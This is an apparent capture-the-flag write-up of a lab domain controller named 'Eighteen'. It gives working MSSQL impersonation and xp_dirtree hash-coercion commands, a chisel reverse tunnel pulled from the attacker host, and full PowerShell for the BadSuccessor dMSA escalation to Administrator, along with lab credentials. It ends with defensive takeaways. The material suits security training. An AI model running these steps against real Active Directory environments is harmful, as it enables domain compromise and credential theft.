// Section 01

Machine Overview

Eighteen is a Hard-rated Windows Server 2025 Domain Controller that chains together MSSQL credential discovery, NTLMv2 coercion, and the newly disclosed BadSuccessor (CVE-2025-53779) vulnerability — an Active Directory privilege escalation path unique to Windows Server 2025's Delegated Managed Service Accounts. Exploitation requires tunnelling past firewall restrictions to reach Kerberos and LDAP services, and precise manipulation of dMSA object attributes to inherit Administrator credentials.

Reconnaissance & Initial Access

01
Nmap Port Scan
Phase 1 — Service Enumeration

Initial scan reveals three externally reachable services. Domain Controller ports — Kerberos (88), LDAP (389), SMB (445), LDAPS (636) — are firewalled from the attacker's perspective, a critical detail that forces the use of tunnelling later in the attack chain.

bash
nmap -sC -sV -Pn 10.129.5.161

Firewall Note: Kerberos (88) and LDAP (389) are filtered externally. A reverse tunnel will be required for Kerberos ticket operations in the privilege escalation phase.
02
Web Application — Hardcoded Credentials
Phase 2 — Flask App Source Disclosure

Port 80 serves a Flask application hosted on IIS. Exploring the application source at C:\inetpub\eighteen.htb\app.py reveals MSSQL credentials hardcoded directly in the application source file — a classic developer mistake in a production environment.

✓
Credentials found: MSSQL login — appdev : MissThisElite$90
⚠
Security Issue: Hardcoding database credentials in web application source code is a critical misconfiguration. Any LFI, directory traversal, or backup file disclosure exposes them immediately.

MSSQL Exploitation & Credential Chain

03
MSSQL Login & Impersonation
Phase 3 — SQL Login Enumeration + EXECUTE AS

Connecting to MSSQL as appdev and enumerating SQL logins reveals a second account, kevin, with impersonation privileges. Using EXECUTE AS LOGIN, we can elevate to the sa context for subsequent coercion.

bash
impacket-mssqlclient 'appdev:MissThisElite$90'@10.129.5.161
✓
Additional SQL login: kevin : iNa2we6haRj2gaw! — has impersonation privileges.
04
NTLMv2 Hash Capture via xp_dirtree
Phase 4 — Coerced Authentication

After impersonating sa via kevin's privileges, we use xp_dirtree to coerce the SQL Server to authenticate against an attacker-controlled SMB listener running Responder, capturing an NTLMv2 hash for a domain user.

bash — Kali
# Start Responder on attacker interface
responder -I tun0
sql — MSSQL as kevin
-- Impersonate sa and trigger outbound auth
EXECUTE AS LOGIN = 'sa';
EXEC xp_dirtree '\\10.10.14.27\share';
◈
How it works: xp_dirtree forces the SQL Server process to perform a network file listing, causing it to authenticate via NTLM to the attacker's share. Responder captures the NTLMv2 challenge-response which can then be cracked offline.
05

Through cracking the captured NTLMv2 hash and/or password spraying against discovered domain accounts, credentials for adam.scott are recovered. Adam is a member of the IT group and has WinRM access to the DC.

// Section 04

Privilege Escalation — BadSuccessor

✕
CVE-2025-53779 (BadSuccessor): Windows Server 2025 introduces Delegated Managed Service Accounts (dMSA). Any user with CreateChild permission on an OU can create a dMSA and link it to any privileged account as its predecessor, inheriting that account's credentials when the dMSA is activated.
07
Enumerate ACLs — Confirm CreateChild
Phase 7 — ACL Enumeration on OU=Staff

Confirm that the IT group (which adam.scott belongs to) holds CreateChild permission on OU=Staff. This is the entry point for the BadSuccessor attack.

powershell
Import-Module ActiveDirectory
$ouDN = "OU=Staff,DC=eighteen,DC=htb"
$acl  = Get-ACL "AD:\$ouDN"
$acl.Access | Where-Object {
    $_.IdentityReference -eq "EIGHTEEN\IT" -and
    $_.ActiveDirectoryRights -match "CreateChild"
}
✓
Confirmed: EIGHTEEN\IT has CreateChild on OU=Staff,DC=eighteen,DC=htb. Exploitation path is open.
08
Create the Malicious dMSA Object
Phase 8 — Delegated MSA Creation

Create a new msDS-DelegatedManagedServiceAccount object inside OU=Staff. As the object creator, adam.scott becomes its implicit owner with WriteDACL rights.

powershell
$dmsaName = "pwndMSA"
$ouDN     = "OU=Staff,DC=eighteen,DC=htb"

New-ADObject -Name $dmsaName -Type "msDS-DelegatedManagedServiceAccount" -Path $ouDN -OtherAttributes @{
    "sAMAccountName"               = "$dmsaName$"
    "msDS-DelegatedMSAState"        = 0
    "msDS-ManagedPasswordInterval"  = 30
}
09
Grant GenericAll via WriteDACL
Phase 9 — Self-Escalation on dMSA Object

As the object owner, adam.scott has implicit WriteDACL. We use this to grant ourselves GenericAll on the dMSA, enabling all subsequent attribute modifications.

powershell
$dmsaDN = "CN=$dmsaName,$ouDN"
$acl    = Get-ACL "AD:\$dmsaDN"
$ace    = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]"EIGHTEEN\adam.scott",
    [System.DirectoryServices.ActiveDirectoryRights]"GenericAll",
    [System.Security.AccessControl.AccessControlType]"Allow"
)
$acl.AddAccessRule($ace)
Set-ACL "AD:\$dmsaDN" $acl
10
Link dMSA to Administrator as Predecessor
Phase 10 — Predecessor Link (Core of BadSuccessor)

Set the msDS-ManagedAccountPrecededByLink attribute to point to the built-in Administrator account. This tells the DC that pwndMSA has superseded Administrator and should inherit its credentials.

powershell
Set-ADObject -Identity $dmsaDN -Replace @{
    "msDS-ManagedAccountPrecededByLink" = "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
}
◈
Why this works: When a dMSA is marked as superseding a predecessor, the DC includes the predecessor's Kerberos keys in the dMSA's managed password package. Requesting a TGT for the dMSA therefore yields the predecessor's (Administrator's) key material.
11
Set GroupMSAMembership & Activate dMSA
Phase 11 — Enable Password Retrieval + State = 2

Configure msDS-GroupMSAMembership to permit adam.scott to retrieve the managed password, then set msDS-DelegatedMSAState to 2 (active successor). Also remove the ACCOUNTDISABLE flag from the new object.

powershell
$adamSID = (Get-ADUser adam.scott).SID
$sddl = "O:BAD:(A;;RPWPCRLCLOCCDCRCWDWOSDDTSW;;;$adamSID)(A;;RPWPCRLCLOCCDCRCWDWOSDDTSW;;;BA)"
$sd   = New-Object System.Security.AccessControl.RawSecurityDescriptor($sddl)
$sdBytes = New-Object byte[] $sd.BinaryLength
$sd.GetBinaryForm($sdBytes, 0)

Set-ADObject -Identity $dmsaDN -Replace @{
    "msDS-GroupMSAMembership" = $sdBytes
    "msDS-DelegatedMSAState"  = 2
}

# Remove ACCOUNTDISABLE flag: 4130 (disabled) -> 4128 (enabled)
Set-ADObject -Identity $dmsaDN -Replace @{"userAccountControl" = 4128}
12
Chisel Reverse Tunnel — Expose Kerberos & LDAP
Phase 12 — Firewall Bypass via Reverse TCP Tunnel

Kerberos (88) and LDAP (389) are blocked externally. We upload chisel to the target and establish a reverse tunnel back to Kali, then use socat to redirect the standard ports to the tunnel endpoints so impacket can reach them transparently.

bash — Kali
# Download chisel binaries
curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz | gunzip > /tmp/chisel_linux
curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz | gunzip > /tmp/chisel.exe
chmod +x /tmp/chisel_linux

# Serve Windows binary and start chisel server
python3 -m http.server 8080 &
/tmp/chisel_linux server --reverse --port 8080
powershell — Target
# Download and connect back to Kali
Invoke-WebRequest -Uri "http://10.10.14.27:8080/chisel.exe" -OutFile "C:\Users\adam.scott\chisel.exe"
C:\Users\adam.scott\chisel.exe client 10.10.14.27:8080 R:10088:127.0.0.1:88 R:10389:127.0.0.1:389
bash — Kali port redirects
# Map standard ports to tunnel endpoints
socat TCP-LISTEN:88,fork TCP:127.0.0.1:10088 &
socat TCP-LISTEN:389,fork TCP:127.0.0.1:10389 &
13
Clock Skew Fix — Python time.time() Patch
Phase 13 — KRB_AP_ERR_SKEW Mitigation

The Kali clock was ~7 hours behind the DC, causing KRB_AP_ERR_SKEW. Since system time couldn't be changed without root, a Python wrapper patches time.time() and datetime.datetime in-process before running impacket's getST.

python — /tmp/getST_timefixed.py
import time, datetime

_OFFSET = 25200  # 7 hours in seconds

_original_time = time.time
def _patched_time():
    return _original_time() + _OFFSET
time.time = _patched_time

_original_now    = datetime.datetime.now
_original_utcnow = datetime.datetime.utcnow

class PatchedDatetime(datetime.datetime):
    @classmethod
    def now(cls, tz=None):
        if tz is None:
            return _original_now() + datetime.timedelta(seconds=_OFFSET)
        return _original_now(tz) + datetime.timedelta(seconds=_OFFSET)
    @classmethod
    def utcnow(cls):
        return _original_utcnow() + datetime.timedelta(seconds=_OFFSET)

datetime.datetime = PatchedDatetime

import runpy
runpy.run_path('/usr/share/doc/python3-impacket/examples/getST.py', run_name='__main__')
◈
Tip: If you have root access, sudo ntpdate 10.129.5.161 syncs the clock directly and eliminates the need for this wrapper.

Key Takeaways
01 //
BadSuccessor (CVE-2025-53779)
Any AD user with CreateChild on an OU can create a dMSA and link it to a privileged predecessor, inheriting that account's Kerberos keys — with no direct write access to the privileged account itself.
02 //
Hardcoded Credentials in App Source
Embedding database credentials directly in application source code is consistently one of the most exploited weaknesses. Use environment variables, vaults, or managed identity — never static secrets in code.
03 //
MSSQL xp_dirtree Coercion
SQL Server stored procedures like xp_dirtree, xp_fileexist, and xp_cmdshell can force outbound NTLM authentication. Disable them unless explicitly needed and restrict the SQL service account's network access.
04 //
Firewall Bypass via Chisel + socat
Even when firewall rules block AD ports externally, a compromised host inside the network can relay those services to the attacker via reverse TCP tunnels. Network segmentation must be paired with endpoint monitoring to detect lateral tunnelling.
05 //
Kerberos Clock Skew Bypass
Kerberos enforces a ±5 minute clock tolerance. When VM or VPN clocks drift, in-process time patching (or ntpdate) is required to avoid KRB_AP_ERR_SKEW failures. Always sync time before Kerberos operations.
06 //
dMSA Predecessor Key Inheritance
The dMSA key package returned by the DC embeds the predecessor account's current and previous Kerberos RC4 keys. The previous key corresponds to the predecessor's NT hash, enabling direct Pass-the-Hash without cracking.
